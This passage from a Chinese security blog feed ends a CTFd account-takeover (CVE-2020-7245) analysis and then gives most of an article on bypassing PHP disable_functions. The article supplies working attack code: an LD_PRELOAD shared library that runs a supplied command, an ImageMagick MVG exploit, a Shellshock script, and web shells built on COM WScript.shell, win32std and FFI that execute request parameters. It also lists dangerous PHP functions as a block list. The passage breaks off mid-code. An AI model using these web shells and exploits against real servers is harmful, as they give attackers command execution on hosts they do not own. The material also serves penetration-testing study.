Users.query.filter_by(email=email_address).first()</span><br><span class="line"></span><br><span class="line">        get_errors()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> config.can_send_mail() <span class="keyword">is</span> <span class="literal">False</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">"reset_password.html"</span>,</span><br><span class="line">                errors=[<span class="string">"Email could not be sent due to server misconfiguration"</span>],</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> team:</span><br><span class="line">            <span class="keyword">return</span> render_template(</span><br><span class="line">                <span class="string">"reset_password.html"</span>,</span><br><span class="line">                errors=[</span><br><span class="line">                    <span class="string">"If that account exists you will receive an email, please check your inbox"</span></span><br><span class="line">                ],</span><br><span class="line">            )</span><br><span class="line"></span><br><span class="line">        email.forgot_password(email_address, team.name)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> render_template(</span><br><span class="line">            <span class="string">"reset_password.html"</span>,</span><br><span class="line">            errors=[</span><br><span class="line">                <span class="string">"If that account exists you will receive an email, please check your inbox"</span></span><br><span class="line">            ],</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"reset_password.html"</span>)</span><br></pre></td></tr></table></figure><p>可以输入自己的 email ，接着通过 <code>email.forgot_password(email_address, team.name)</code>发送找回密码的邮件</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301215024033.png" alt="image-20200301215024033"></p><p>跟进 <code>forgot_password</code> 函数，<code>/CTFd/utils/email/__init__.py</code>，19 行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">forgot_password</span><span class="params">(email, team_name)</span>:</span></span><br><span class="line">    token = serialize(team_name)</span><br><span class="line">    text = <span class="string">"""Did you initiate a password reset? Click the following link to reset your password:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#123;0&#125;/&#123;1&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>.format(</span><br><span class="line">        url_for(<span class="string">"auth.reset_password"</span>, _external=<span class="literal">True</span>), token</span><br><span class="line">    )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> sendmail(email, text)</span><br></pre></td></tr></table></figure><p>此处的 <code>team_name</code> 是要接管的用户名，查看序列化生成 token 的方法， /CTFd/utils/security/signing.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">serialize</span><span class="params">(data, secret=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        secret = current_app.config[<span class="string">"SECRET_KEY"</span>]</span><br><span class="line">    s = URLSafeTimedSerializer(secret)</span><br><span class="line">    <span class="keyword">return</span> s.dumps(data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unserialize</span><span class="params">(data, secret=None, max_age=<span class="number">432000</span>)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> secret <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        secret = current_app.config[<span class="string">"SECRET_KEY"</span>]</span><br><span class="line">    s = URLSafeTimedSerializer(secret)</span><br><span class="line">    <span class="keyword">return</span> s.loads(data, max_age=max_age)</span><br></pre></td></tr></table></figure><p>使用了 URLSafeTimedSerializer  生成 token</p><p>到这里，利用流程就很明确了</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301221251766.png" alt></p><p>得到重置密码链接</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/ctfd-CVE-2020-7245.assets/image-20200301221537528.png" alt="image-20200301221537528"></p><p>访问链接，填写新密码，再重新登陆即可接管目标用户</p><p>中间在访问重置链接之前的修改用户名的步骤不做也是可以的，因为在 <code>reset_password</code> 函数中反序列化重置链接的 data 得到用户名后，查询方法是 <code>Users.query.filter_by(name=name).first_or_404()</code> ，一般来说目标用户的 id 总是靠前的</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference:"></a>Reference:</h2><p><a href="https://www.colabug.com/2020/0204/6940556/amp/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/amp/</a></p><p><a href="https://github.com/CTFd/CTFd/pull/1218/files" target="_blank" rel="noopener">https://github.com/CTFd/CTFd/pull/1218/files</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;影响版本：CTFd v2.0.0 - v2.2.2&lt;/p&gt;
    
    </summary>
    
    
      <category term="漏洞分析" scheme="http://j0k3r.top/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数</title>
    <link href="http://j0k3r.top/2020/02/13/disable_functions-bypass/"/>
    <id>http://j0k3r.top/2020/02/13/disable_functions-bypass/</id>
    <published>2020-02-12T16:00:00.000Z</published>
    <updated>2020-03-26T10:19:02.074Z</updated>
    
    <content type="html"><![CDATA[<p>文章首发于安全客：<a href="https://www.anquanke.com/post/id/197745" target="_blank" rel="noopener">https://www.anquanke.com/post/id/197745</a></p><a id="more"></a><p>在渗透过程中，有很多 PHP 站点往往设置了disable_functions 来禁止用户调用某些危险函数，给 Getshell 带来了很大的不便，本文对一些常见的绕过方法的原理和使用稍做总结，顺便分享一个 Fuzz 方法，学习一下。</p><p>如有错误，欢迎师傅们指正</p><h2 id="0x01-常用姿势"><a href="#0x01-常用姿势" class="headerlink" title="0x01 常用姿势"></a>0x01 常用姿势</h2><h3 id="1-黑名单-bypass"><a href="#1-黑名单-bypass" class="headerlink" title="1. 黑名单 bypass"></a>1. 黑名单 bypass</h3><p>众所周知，disable_functions 是基于黑名单来实现对某些函数使用的限制的，既然是黑名单有时候就难免会有漏网之鱼</p><p>PHP 中能直接执行系统程序的函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">system()</span><br><span class="line">shell_exec(）</span><br><span class="line">exec()</span><br><span class="line">passthru()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br><span class="line">pcntl_exec()</span><br><span class="line">dl() // 加载自定义 php 扩展</span><br></pre></td></tr></table></figure><p>PHP 中执行运算符（反引号）的效果和 shell_exec() 是相同的</p><p>一些比较严格的 disable_functions  限制项</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">passthru,exec,system,putenv,chroot,chgrp,chown,shell_exec,popen,proc_open,pcntl_exec,ini_alter,ini_restore,dl,openlog,syslog,readlink,symlink,popepassthru,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,imap_open,apache_setenv</span><br></pre></td></tr></table></figure><h3 id="2-LD-PRELOAD-amp-putenv-bypass-disable-functions"><a href="#2-LD-PRELOAD-amp-putenv-bypass-disable-functions" class="headerlink" title="2. LD_PRELOAD &amp; putenv() bypass disable_functions"></a>2. LD_PRELOAD &amp; putenv() bypass disable_functions</h3><p>Windows？</p><p>LD_PRELOAD 是一个 Unix 中比较特殊的环境变量，也产生过很多安全问题</p><p>简介</p><blockquote><p>​    LD_PRELOAD 是一个可选的 Unix 环境变量，包含一个或多个共享库或共享库的路径，加载程序将在包含 C 运行时库（libc.so）的任何其他共享库之前加载该路径。这称为预加载库。</p></blockquote><blockquote><p>​    也就是说它可以影响程序的运行时的链接（Runtime linker），它允许你定义在程序运行前优先加载的动态链接库。即我们可以自己生成一个动态链接库加载，以覆盖正常的函数库，也可以注入恶意程序，执行恶意命令。</p></blockquote><p>LD_PRELOAD 绕过 disable_functions 的原理就是劫持系统函数，使程序加载恶意动态链接库文件，从而执行系统命令等敏感操作</p><p>举个例子，我们来改变一下 Linux 系统中最常见的命令 —— <code>id</code></p><p><code>strace -f id</code></p><p>使用 strace 对应用的系统调用和信号传递的跟踪结果来对应用进行分析，了解应用工作过程的</p><p>strace会记录和解析命令进程的所有系统调用以及这个进程所接收到的所有的信号值，要在 Docker 中使用 strace 需要先关闭安全功能再启动 <code>docker run --security-opt seccomp:unconfined -d xxx</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis1.png" alt></p><p>像这种简单的无参系统函数就是比较好的劫持对象，</p><p><code>man 2 geteuid</code> 命令查看 geteuid 系统函数需要什么头文件和格式</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis2.png" alt></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uid_t</span> geteuid(<span class="keyword">void</span>)&#123;</span><br><span class="line">        system(<span class="string">"cat /etc/passwd"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>生成动态链接库</p><p><code>gcc --share -fPIC bad.c -o bad.so</code></p><p>使用 LD_PRELOAD 加载刚生成的 bad.so，再执行 <code>id</code> 命令看看效果</p><p><code>LD_PRELOAD=./bad.so id</code></p><p><strong>LD_PRELOAD 作为进程独占环境变量，它与待执行命令间必须为空白字符</strong></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis3.png" alt></p><p>成功执行的我们自定义的恶意代码，读取了 passwd 文件</p><p>通用动态链接库代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line">__attribute__((constructor)) <span class="function"><span class="keyword">void</span> <span class="title">j0k3r</span><span class="params">()</span></span>&#123;</span><br><span class="line">    unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">    <span class="keyword">if</span> (getenv(<span class="string">"cmd"</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        system(getenv(<span class="string">"cmd"</span>));</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        system(<span class="string">"echo 'no cmd' &gt; /tmp/cmd.output"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​    利用 GNU C 中的特殊语法 <code>__attribute__ ((attribute-list))</code>，当参数为 constructor 时就可以在加载共享库时运行，通常是在程序启动过程中，因为带有”构造函数”属性的函数将在 main() 函数之前被执行，类似的，若是换成 destructor 参数，则该函数会在 main() 函数执行之后或者 exit() 被调用后被自动执行</p><p>也就是说在 PHP 运行过程中只要有新程序启动，在我们加载恶意动态链接库的条件下，便可以执行 .so 中的恶意代码</p><p>比如 PHP 中经典的 mail() 函数，看看当 PHP 执行 mail() 函数的时候有没有执行程序或者启动新进程</p><p><code>strace -f php -r &quot;mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);&quot; 2&gt;&amp;1 | grep -E &quot;execve|fork|vfork&quot;</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis5.png" alt></p><p>​    可以明显发现 mai() 函数使用 execve 启动了 sendmail，接着可以使用 readelf -Ws 或者 strace 命令查看 sendmail 程序的系统函数调用情况</p><p>在 PHP 中使用 putenv() 函数设置环境变量, 仅存活于当前请求期间。在请求结束时环境会恢复到初始状态</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">putenv(<span class="string">"cmd=cat /etc/passwd"</span>);</span><br><span class="line">putenv(<span class="string">"LD_PRELOAD=./bad.so"</span>);</span><br><span class="line">mail(<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>,<span class="string">''</span>);</span><br></pre></td></tr></table></figure><p>运行该 PHP 文件即可成功执行命令，就算没有安装 sendmail 也能成功利用</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis6.png" alt></p><p>如果 mail() 函数无法使用，也可以使用 <code>error_log(&#39;&#39;,1)</code> 或者 <code>mb_send_mail(&#39;&#39;,&#39;&#39;,&#39;&#39;)</code> 和 <code>imap_mail(&quot;1@a.com&quot;,&quot;0&quot;,&quot;1&quot;,&quot;2&quot;,&quot;3&quot;)</code>（如果 PHP 开启了 imap 模块）</p><p>如果 PHP 安装了 imagick 模块，则还可以使用 Imagick，其在遇到 MPEG format 的时候，会调用 ffmpeg 进程来处理，比如使用 <code>new Imagick(&#39;1.mp4&#39;)</code> </p><p>文章后面有一部分关于确定这类使用 execve 系统调用的 php 函数的 Fuzz 方法</p><h3 id="3-ImageMagick-bypass-disable-functions"><a href="#3-ImageMagick-bypass-disable-functions" class="headerlink" title="3. ImageMagick bypass disable_functions"></a>3. ImageMagick bypass disable_functions</h3><p>利用 ImageMagick 命令执行漏洞（CVE-2016–3714）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Disable Functions: "</span> . ini_get(<span class="string">'disable_functions'</span>) . <span class="string">"\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">AAAA</span><span class="params">()</span></span>&#123;</span><br><span class="line">$command = <span class="string">'curl 127.0.0.1:7777'</span>;</span><br><span class="line"></span><br><span class="line">$exploit = <span class="string">&lt;&lt;&lt;EOF</span></span><br><span class="line"><span class="string">push graphic-context</span></span><br><span class="line"><span class="string">viewbox 0 0 640 480</span></span><br><span class="line"><span class="string">fill 'url(https://example.com/image.jpg"|<span class="subst">$command</span>")'</span></span><br><span class="line"><span class="string">pop graphic-context</span></span><br><span class="line"><span class="string">EOF;</span></span><br><span class="line"></span><br><span class="line">file_put_contents(<span class="string">"KKKK.mvg"</span>, $exploit);</span><br><span class="line">$thumb = <span class="keyword">new</span> Imagick();</span><br><span class="line">$thumb-&gt;readImage(<span class="string">'KKKK.mvg'</span>);</span><br><span class="line">$thumb-&gt;writeImage(<span class="string">'KKKK.png'</span>);</span><br><span class="line">$thumb-&gt;clear();</span><br><span class="line">$thumb-&gt;destroy();</span><br><span class="line">unlink(<span class="string">"KKKK.mvg"</span>);</span><br><span class="line">unlink(<span class="string">"KKKK.png"</span>);</span><br><span class="line">&#125;</span><br><span class="line">AAAA();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>复现环境 <a href="https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1" target="_blank" rel="noopener">https://github.com/Medicean/VulApps/tree/master/i/imagemagick/1</a></p><h3 id="4-PHP-5-x-Shellshock-Exploit-bypass-disable-functions"><a href="#4-PHP-5-x-Shellshock-Exploit-bypass-disable-functions" class="headerlink" title="4. PHP 5.x Shellshock Exploit (bypass disable_functions)"></a>4. PHP 5.x Shellshock Exploit (bypass disable_functions)</h3><p>PHP &lt; 5.6.2 - ‘Shellshock’ Safe Mode / Disable Functions Bypass / Command Injection</p><p>exploit-db 上的脚本</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)</span></span><br><span class="line"><span class="comment"># Google Dork: none</span></span><br><span class="line"><span class="comment"># Date: 10/31/2014</span></span><br><span class="line"><span class="comment"># Exploit Author: Ryan King (Starfall)</span></span><br><span class="line"><span class="comment"># Vendor Homepage: http://php.net</span></span><br><span class="line"><span class="comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror</span></span><br><span class="line"><span class="comment"># Version: 5.* (tested on 5.6.2)</span></span><br><span class="line"><span class="comment"># Tested on: Debian 7 and CentOS 5 and 6</span></span><br><span class="line"><span class="comment"># CVE: CVE-2014-6271</span></span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="string">"Disabled functions: "</span>.ini_get(<span class="string">'disable_functions'</span>).<span class="string">"\n"</span>; <span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">shellshock</span><span class="params">($cmd)</span> </span>&#123; <span class="comment">// Execute a command via CVE-2014-6271 @ mail.c:283</span></span><br><span class="line">   <span class="keyword">if</span>(strstr(readlink(<span class="string">"/bin/sh"</span>), <span class="string">"bash"</span>) != <span class="keyword">FALSE</span>) &#123;</span><br><span class="line">     $tmp = tempnam(<span class="string">"."</span>,<span class="string">"data"</span>);</span><br><span class="line">     putenv(<span class="string">"PHP_LOL=() &#123; x; &#125;; $cmd &gt;$tmp 2&gt;&amp;1"</span>);</span><br><span class="line">     <span class="comment">// In Safe Mode, the user may only alter environment variables whose names</span></span><br><span class="line">     <span class="comment">// begin with the prefixes supplied by this directive.</span></span><br><span class="line">     <span class="comment">// By default, users will only be able to set environment variables that</span></span><br><span class="line">     <span class="comment">// begin with PHP_ (e.g. PHP_FOO=BAR). <span class="doctag">Note:</span> if this directive is empty,</span></span><br><span class="line">     <span class="comment">// PHP will let the user modify ANY environment variable!</span></span><br><span class="line">     mail(<span class="string">"a@127.0.0.1"</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">""</span>,<span class="string">"-bv"</span>); <span class="comment">// -bv so we don't actually send any mail</span></span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"Not vuln (not bash)"</span>;</span><br><span class="line">   $output = @file_get_contents($tmp);</span><br><span class="line">   @unlink($tmp);</span><br><span class="line">   <span class="keyword">if</span>($output != <span class="string">""</span>) <span class="keyword">return</span> $output;</span><br><span class="line">   <span class="keyword">else</span> <span class="keyword">return</span> <span class="string">"No output, or not vuln."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> shellshock($_REQUEST[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="5-PHP-FPM-FastCGI-bypass-disable-functions"><a href="#5-PHP-FPM-FastCGI-bypass-disable-functions" class="headerlink" title="5. PHP-FPM/FastCGI bypass disable_functions"></a>5. PHP-FPM/FastCGI bypass disable_functions</h3><p>​    大家都知道。Web Server 只是负责分发数据，那如果 Nginx 遇到 php 动态请求该怎么处理，这时就需要了解 PHP-FPM 和 FastCGI 了</p><p>​    FastCGI 是用于将交互式程序与 Web 服务器接口的二进制协议。FastCGI 是早期的通用网关接口（CGI）的变体。FastCGI 的主要目的是减少与Web服务器和 CGI 程序接口相关的开销，从而使服务器可以一次处理更多的网页请求。</p><p>​    PHP-FPM（ FastCGI 进程管理器）是另一种 PHP FastCGI 实现，具有一些其他功能，可用于各种规模的站点，尤其是繁忙的站点。PHP-FPM 也是用于调度管理 PHP 解析器php-cgi 的管理程序，php-cgi 作为 PHP 自带的解释器，只是个 CGI 程序，除了解析请求返回结果之外，并不能管理进程，也就无法做到修改 php.ini 配置文件后平滑重启</p><p>​    即 FastCGI 是 CGI 协议的升级版，用于封装 webserver 发送给 php 解释器的数据，通过 PHP-FPM 程序按照 FastCGI 协议进行处理和解析数据，返回结果给 webserver</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis7.png" alt></p><p>​    PHP5.3 版本之后，PHP-FPM 是内置于 PHP 的，一般来说，尤其是在高并发的情况下，nginx + PHP-FPM 的组合要比 apache + mod_php 好很多</p><p>那么伪造请求发送给 PHP-FPM 不就可以任意代码执行</p><p>脚本：<a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75" target="_blank" rel="noopener">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>本地测试</p><p><code>python fpm.py -c &#39;&lt;?php echo `id`;exit;?&gt;&#39; -p 9999 127.0.0.1 /var/www/html/test.php</code></p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis8.png" alt></p><h3 id="6-Windows-系统组件-COM"><a href="#6-Windows-系统组件-COM" class="headerlink" title="6. Windows 系统组件 COM"></a>6. Windows 系统组件 COM</h3><p>​    COM（Component Object Model）组件对象模型，是一种跨应用和语言共享二进制代码的方法。COM 可以作为 DLL 被本机程序载入也可以通过 DCOM 被远程进程调用</p><p><code>C:\Windows\System32</code> 下的 wshom.ocx 能够提供 WshShell 对象和 WshNetwork 对象接口的访问，也就是提供对本地 Windows shell 和计算机所连接的网络上共享资源的访问</p><p>php.ini 中开启 <code>com.allow_dcom</code></p><p><code>com.allow_dcom = true</code></p><p>因为是在 Windows，如果在拓展文件夹 php/ext/ 中存在 php_com_dotnet.dll</p><p>到 php.ini 中开启拓展</p><p><code>extension=php_com_dotnet.dll</code></p><p>重启服务在 phpinfo 中就能看到开启了 com_dotnet</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$command = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line">$wsh = <span class="keyword">new</span> COM(<span class="string">'WScript.shell'</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Create Wscript.Shell Failed!"</span>);</span><br><span class="line">$exec = $wsh-&gt;exec(<span class="string">"cmd /c"</span>.$command); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line">$stdout = $exec-&gt;StdOut();</span><br><span class="line">$stroutput = $stdout-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> $stroutput;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用上面的 PHP 代码通过 COM 对象的 exec() 方法即可绕过 disable_functions 执行命令</p><p><img src="https://blog-j0k3r.oss-cn-beijing.aliyuncs.com/assets/disable_functions-bypass.assets/dis9.png" alt></p><h3 id="7-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions"><a href="#7-PHP-5-2-3-win32std-extension-safe-mode-and-bypass-disable-functions" class="headerlink" title="7. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions"></a>7. PHP 5.2.3 win32std extension safe_mode and bypass disable_functions</h3><p>这个貌似比较古老了 <a href="https://www.exploit-db.com/exploits/4218" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/4218</a></p><p>exploit-db 上的 exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 5.2.3 win32std extension safe_mode and disable_functions protections bypass</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//author: shinnai</span></span><br><span class="line"><span class="comment">//mail: shinnai[at]autistici[dot]org</span></span><br><span class="line"><span class="comment">//site: http://shinnai.altervista.org</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Tested on xp Pro sp2 full patched, worked both from the cli and on apache</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Thanks to rgod for all his precious advises :)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//I set php.ini in this way:</span></span><br><span class="line"><span class="comment">//safe_mode = On</span></span><br><span class="line"><span class="comment">//disable_functions = system</span></span><br><span class="line"><span class="comment">//if you launch the exploit from the cli, cmd.exe will be wxecuted</span></span><br><span class="line"><span class="comment">//if you browse it through apache, you'll see a new cmd.exe process activated in taskmanager</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!extension_loaded(<span class="string">"win32std"</span>)) <span class="keyword">die</span>(<span class="string">"win32std extension required!"</span>);</span><br><span class="line">system(<span class="string">"cmd.exe"</span>); <span class="comment">//just to be sure that protections work well</span></span><br><span class="line">win_shell_execute(<span class="string">"..\\..\\..\\..\\windows\\system32\\cmd.exe"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="8-FFI-绕过-disable-functions"><a href="#8-FFI-绕过-disable-functions" class="headerlink" title="8. FFI 绕过 disable_functions"></a>8. FFI 绕过 disable_functions</h3><p>PHP7.4 的一个新特性 FFI（Foreign Function Interface），即外部函数接口，可以让我们在 PHP 中调用 C 代码</p><p>建议在 Docker 中进行测试</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libffi-dev</span><br><span class="line"></span><br><span class="line">docker-php-ext-install ffi</span><br></pre></td></tr></table></figure><p>通常使用 FFI::cdef 创建一个新的 FFI 对象，下面是官方说明</p><p><code>public static FFI::cdef ([ string $code = &quot;&quot; [, string $lib ]] ) : FFI</code></p><blockquote><p>Parameters</p><p>code</p><p>A string containing a sequence of declarations in regular C language (types, structures, functions, variables, etc). Actually, this string may be &gt; copy-pasted from C header files.</p><p>Note:</p><p>C preprocessor directives are not supported, i.e. #include, #define and CPP macros do not work.</p><p>lib</p><p>The name of a shared library file, to be loaded and linked with the definitions.</p><p>Note:</p><p>If lib is omitted, platforms supporting RTLD_DEFAULT attempt to lookup symbols declared in code in the normal global scope. Other systems will fail to &gt; resolve these symbols.</p></blockquote><p>那如何执行系统命令呢，使用 FFI::cdef 声明一个 system 函数使用就可以了， <code>man system</code> 查看 system 函数说明，直接复制就好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$ffi = FFI::cdef(</span><br><span class="line">    <span class="string">"int system(const char *command);"</span>,</span><br><span class="line">    <span class="string">"libc.so.6"</span>);</span><br><span class="line"></span><br><span class="line">$ffi-&gt;system(<span class="string">"id"</span>);</span><br><span class="line"></span><br><span 